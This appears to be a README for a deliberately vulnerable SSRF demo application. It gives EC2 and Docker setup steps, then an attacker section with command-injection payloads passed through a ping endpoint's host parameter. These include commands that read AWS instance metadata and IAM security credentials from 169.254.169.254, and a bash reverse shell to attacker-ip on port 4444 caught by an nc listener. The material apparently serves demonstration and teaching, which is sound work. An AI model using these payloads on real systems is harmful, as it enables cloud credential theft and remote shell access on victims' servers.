# Setup EC2
- Connect to EC2
```
ssh -i <pem-key>.pem ec2-user@<ec2-public-ip>
```

- Setup EC2
```
sudo yum install docker -y
sudo service docker start
sudo yum install git -y
```

- (Optional) Test docker
```
docker run hello-world
```

- Start application
```
git clone https://github.com/agusalberca/ssrf-demo-app.git
cd /home/ec2-user/ssrf-demo-app
sudo docker build -t ssrf-demo-app .
sudo docker run -d -p 3000:3000 --name ssrf-demo-app ssrf-demo-app
```

# Atacker machine

## Exploit 1
Post to endpoint `curl 'https://<victim-id>:3000/ping?host='` or use UI at `https://<victim-id>/:3000`:
- `8.8.8.8; ls -la`
- `8.8.8.8; curl -IL -s https://www.google.com`
- `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/'`
- `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'`
- `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_read_only_role'`

## Exploit 2
Run local listener: `nc -lvp 4444`

Post to endpoint `curl 'https://<victim-id>:3000/ping?host='` or use UI at `https://<victim-id>/:3000`:
- `8.8.8.8; bash -i >& /dev/tcp/attacker-ip/4444 0>&1`